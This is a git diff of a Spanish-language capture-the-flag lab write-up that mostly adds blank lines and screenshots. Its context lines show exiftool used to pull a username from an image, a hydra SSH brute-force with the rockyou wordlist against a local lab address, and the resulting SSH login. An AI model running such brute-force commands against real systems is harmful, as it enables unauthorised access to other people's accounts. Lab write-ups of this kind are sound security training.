@@ -79,6 +79,7 @@ Lo cual nos da una pista. Buscaremos  más información dentro de esta imagen co
 ```
 exiftool imagen.jpeg
 ```
+
 ![Img](./images/6.png)
 
 Y ahí tenemos un usuario `borazuwarah`
@@ -88,6 +89,7 @@ Ahora fuerza bruta.
 ```
 hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
+
 ![Img](./images/7.png)
 
 ```
@@ -97,3 +99,6 @@ ssh borazuwarah@172.17.0.2
 
 
 Y ya estamos adentro. 
+
+
+![](Pasted%20image%2020241120182640.png)
